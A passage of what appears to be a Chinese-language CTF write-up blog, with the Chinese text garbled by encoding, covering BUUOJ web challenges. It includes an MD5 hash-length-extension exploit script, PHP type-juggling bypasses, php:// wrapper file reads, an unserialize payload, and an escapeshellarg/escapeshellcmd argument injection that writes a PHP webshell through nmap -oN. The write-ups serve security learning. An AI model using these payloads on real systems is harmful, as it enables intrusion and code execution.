class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):     </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>åˆ†æä»£ç å¯çŸ¥ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/De1ta ä»æˆ‘ä»¬ä¼ å…¥çš„url å’Œ cookieä¸­å¾—åˆ°å‚æ•° -&gt; waf() ç¦ç”¨æ•æ„Ÿåè®® -&gt; Task() -&gt; Exec()</span><br><span class=\"line\"></span><br><span class=\"line\">-&gt; å…ˆæ£€æŸ¥Sign-checkSign()</span><br><span class=\"line\">     getSign(self.action, self.param) == self.sign</span><br><span class=\"line\">     hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\">        </span><br><span class=\"line\">-&gt; åˆ¤æ–­åŠ¨ä½œ</span><br><span class=\"line\">\tscan-<span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action <span class=\"comment\"># æ³¨æ„æ˜¯ in</span></span><br><span class=\"line\">    </span><br><span class=\"line\">       tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">       resp = scan(self.param)</span><br><span class=\"line\">           urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">           <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">           tmpfile.write(resp)</span><br><span class=\"line\">        </span><br><span class=\"line\">\tread-<span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">       f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">       result[<span class=\"string\">'data'</span>] = f.read()</span><br></pre></td></tr></table></figure>\n\n<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¦å…ˆé€šè¿‡ <code>checkSign()</code> çš„æ£€æŸ¥ä»¥åæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥ã€‚è€Œåœ¨ä»£ç ä¸­ä¸“é—¨ç»™å‡ºä¸€ä¸ªè·¯ç”±ï¼Œå°†ç”Ÿæˆçš„ Sign å‘é€ç»™ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯å‘Šè¯‰äº†æˆ‘ä»¬åŠ å¯†çš„ç»“æœã€‚</p>\n<p>äºæ˜¯ï¼Œæˆ‘çŸ¥é“äº† md5 åŠ å¯†çš„ä¸€ä¸ªç»“æœï¼Œä» <code>hashlib.md5(secert_key + param + action).hexdigest()</code> ä»¥åŠ <code>secert_key</code> é•¿åº¦å·²çŸ¥ï¼Œå¯ä»¥ä½¿ç”¨ <code>hash extend attack</code> æ¥æ„é€ åˆé€‚çš„<code>sign</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Input Signature: <span class=\"number\">9</span>f1d78f610b5e32249e30d1161ff4e81</span><br><span class=\"line\">Input Data: local_file:flag.txtscan</span><br><span class=\"line\">Input Key Length: <span class=\"number\">16</span></span><br><span class=\"line\">Input Data to Add: read</span><br><span class=\"line\"><span class=\"number\">4</span>a0fa89f8745038437386ca78367e28d</span><br><span class=\"line\">local_file:flag.txtscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x008\\x01\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬æ³¨æ„åˆ°è¦å¾—åˆ°æ–‡ä»¶çš„å†…å®¹éœ€è¦ read in action , äºæ˜¯æˆ‘ä»¬å¡«å…… read ã€‚</p>\n<p>payload.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://a917963c-0d87-4c23-b312-40315cbdd792.node3.buuoj.cn\"</span></span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get Sign</span></span><br><span class=\"line\">route = <span class=\"string\">\"/geneSign\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">re1 = s.get(url + route+<span class=\"string\">\"?param=local_file:flag.txt\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re1.content, re1.request.headers</span><br><span class=\"line\"></span><br><span class=\"line\">hashs = <span class=\"string\">\"4a0fa89f8745038437386ca78367e28d\"</span></span><br><span class=\"line\">action = <span class=\"string\">\"scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read\"</span></span><br><span class=\"line\"><span class=\"comment\"># action = a.replace(\"\\\\x\", \"%\")</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> action</span><br><span class=\"line\">cookie = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"action\"</span>: action,</span><br><span class=\"line\">    <span class=\"string\">\"sign\"</span>: hashs,</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">route2 = <span class=\"string\">\"/De1ta\"</span></span><br><span class=\"line\">re2 = s.get(url + route2 + <span class=\"string\">\"?param=local_file:flag.txt\"</span>, cookies=cookie)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re2.content</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Buy-Flag\"><a href=\"#Buy-Flag\" class=\"headerlink\" title=\"Buy Flag\"></a>Buy Flag</h3><p>æŸ¥çœ‹æºç å‘ç°ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">post money <span class=\"keyword\">and</span> password~~~</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">\t$password = $_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_numeric($password)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"password can't be number&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">elseif</span> ($password == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Password Right!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æŠ“åŒ…ä¼ æ•°æ®ï¼š</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/pay.php</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: b1fc07df-c7ae-46e3-8a06-565ab682d9ca.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">DNT</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: user=1</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: keep-alive</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 28</span><br><span class=\"line\"></span><br><span class=\"line\">money[]00000000&amp;password=404%23</span><br></pre></td></tr></table></figure>\n\n<p>å‘ç°èº«ä»½éªŒè¯ä¸é€šè¿‡ï¼Œçœ‹åˆ° Cookie ï¼Œæ”¹æˆ 1 ï¼›ç»•è¿‡ <code>is_numeric</code> åŠ  </p>\n<p><code>%23</code> ; ä¼ å®Œåˆæç¤º money é•¿åº¦è¿‡é•¿ï¼Œæ•°ç»„ç»•è¿‡ã€‚</p>\n<h3 id=\"nizhuansiwei\"><a href=\"#nizhuansiwei\" class=\"headerlink\" title=\"nizhuansiwei\"></a>nizhuansiwei</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">\"text\"</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the zjctf\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;&lt;h1&gt;\"</span>.file_get_contents($text,<span class=\"string\">'r'</span>).<span class=\"string\">\"&lt;/h1&gt;&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Not now!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code> ä¼ªåè®®postæ•°æ®ï¼š <code>php://input</code> ;</p>\n<p><code>include($file);</code> è¿™é‡ŒåŒ…å«äº†ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”æç¤ºæ–‡ä»¶åå­—ï¼Œæˆ‘ä»¬å†ç”¨å¦ä¸€ä¸ªä¼ªåè®®è¯»ä¸€ä¸‹æ–‡ä»¶å†…å®¹ï¼š</p>\n<p><code>php://filter/convert.base64-encode/resource=useless.php</code></p>\n<p>*æ³¨ï¼šåªæœ‰ä¸€ä¸ª <code>include()</code> å³å¯ä½¿ç”¨ä¼ªåè®®å°†æ–‡ä»¶å†…å®¹åŒ…å«å‡ºæ¥</p>\n<p>å°†å¾—åˆ°å†…å®¹è§£å¯†ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿›è¡Œåºåˆ—åŒ–ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = <span class=\"keyword\">new</span> Flag();</span><br><span class=\"line\">$a-&gt;file = <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>\n\n<p>ç°åœ¨çš„ url ï¼š<code>buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>\n<h3 id=\"include\"><a href=\"#include\" class=\"headerlink\" title=\"include\"></a>include</h3><p>ä¼ªåè®® <code>?file=php://filter/convert.base64-encode/resource=index.php</code> è¯»ä¸€ä¸‹æºç </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class=\"line\">\texit(&apos;hacker!&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($file)&#123;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &apos;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&apos;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>å“¦ï¼Œç„¶åç›´æ¥è¯» <code>flag.php</code></p>\n<h3 id=\"Online-Tool\"><a href=\"#Online-Tool\" class=\"headerlink\" title=\"Online Tool\"></a>Online Tool</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class=\"line\">    $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] = $_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'host'</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $host = $_GET[<span class=\"string\">'host'</span>];</span><br><span class=\"line\">    $host = escapeshellarg($host);</span><br><span class=\"line\">    $host = escapeshellcmd($host);</span><br><span class=\"line\">    $sandbox = md5(<span class=\"string\">\"glzjin\"</span>. $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'you are in sandbox '</span>.$sandbox;</span><br><span class=\"line\">    @mkdir($sandbox);</span><br><span class=\"line\">    chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> system(<span class=\"string\">\"nmap -T5 -sT -Pn --host-timeout 2 -F \"</span>.$host);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ç™¾åº¦åˆ°æ–‡ç« </p>\n<p>æˆ‘ä»¬ç¼–å†™ç¤ºä¾‹ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param = <span class=\"string\">\"127.0.0.1' -v -d a=1\"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"curl \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">è¾“å‡ºç»“æœï¼š</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'127.0.0.1'</span>\\<span class=\"string\">''</span> -v -d a=<span class=\"number\">1</span><span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">curl '</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class=\"line\"><span class=\"string\">                                 Dload  Upload   Total   Spent    Left  Speed</span></span><br><span class=\"line\"><span class=\"string\">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: 127.0.0.1\\</span></span><br><span class=\"line\"><span class=\"string\">* Closing connection 0</span></span><br></pre></td></tr></table></figure>\n\n<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥ <code>127.0.0.1&#39; -v -d a=1</code> åï¼Œç»è¿‡ <code>escapeshellarg()</code> è½¬ä¹‰å˜æˆ<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1&#39;</code> ã€‚</p>\n<p> <code>&#39;</code> è¢«è½¬ä¹‰ä¸º <code>\\&#39;</code> ,è¢«éš”å¼€çš„ä¸¤éƒ¨åˆ†åˆ†åˆ«å·¦å³ä¸¤ç«¯åŠ ä¸Šä¸€å¯¹ <code>&#39;&#39;</code> ç„¶åè¿æ¥åœ¨ä¸€èµ·ï¼›</p>\n<p> ç„¶åç»è¿‡ <code>escapeshelcmd()</code> åï¼Œå˜æˆäº† <code>&#39;127.0.0.1&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>, å¯ä»¥çœ‹åˆ°ä¸Šä¸€æ­¥ç•™ä¸‹çš„ <code>\\</code> å†æ¬¡è¢«è½¬ä¹‰æˆ <code>\\\\</code> ï¼Œè¿™æ—¶å°±åªè¡¨ç¤º <code>\\</code> ï¼Œä¸èµ·è½¬ä¹‰ä½œç”¨ï¼Œäºæ˜¯ <code>127.0.0.1</code> å•ç‹¬æˆç»„ï¼Œç´§è·Ÿ <code>\\</code> ï¼Œåé¢ä¸¤ä¸ªå•å¼•å·å•ç‹¬æˆç»„ <code>&#39;&#39;</code> ï¼Œåªå‰©ä¸‹ç»“å°¾çš„ä¸€ä¸ª <code>&#39;</code> è¢«è½¬ä¹‰ <code>\\&#39;</code> </p>\n<p>æœ€åæ‰§è¡Œçš„å‘½ä»¤å°±å˜æˆäº† <code>curl &#39;127.0.0.1&#39;\\ -v -d a=1&#39;</code> , è¯·æ±‚çš„æ˜¯ <code>127.0.0.1\\</code> , POSTçš„æ•°æ®æ˜¯ <code>a=1&#39;</code> .</p>\n<p>å›åˆ°é¢˜ç›®å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ˜¯ <code>&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host</code>  ,è€Œé€šè¿‡æŸ¥çœ‹ nmap æ‰‹å†Œå‘ç°è¾“å‡ºå‘½ä»¤ï¼Œæˆ‘ä»¬è¯•ä¸€ä¸‹</p>\n<p><code>nmap 127.0.0.1 -oN 1.php</code> </p>\n<p>æŸ¥çœ‹ 1.php å†…å®¹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Thu Apr 23 19:48:07 2020 as: nmap -oN 1.php 127.0.0.1</span></span><br><span class=\"line\">Nmap scan report for localhost (127.0.0.1)</span><br><span class=\"line\">Host is up (0.0000060s latency).</span><br><span class=\"line\">Not shown: 998 closed ports</span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">111/tcp open  rpcbind</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap <span class=\"keyword\">done</span> at Thu Apr 23 19:48:08 2020 -- 1 IP address (1 host up) scanned <span class=\"keyword\">in</span> 0.51 seconds</span></span><br></pre></td></tr></table></figure>\n\n<p>æœ‰äº†ä¸Šé¢çš„çŸ¥è¯†åï¼Œå‰©ä¸‹çš„å°±æ˜¯æƒ³åŠæ³•ç»•è¿‡é¢˜ç›®çš„é™åˆ¶</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">example.php</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param1 = <span class=\"string\">\" ' &lt;?php echo `ls`;?&gt; -oN 1.php ' \"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param1);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"nmap 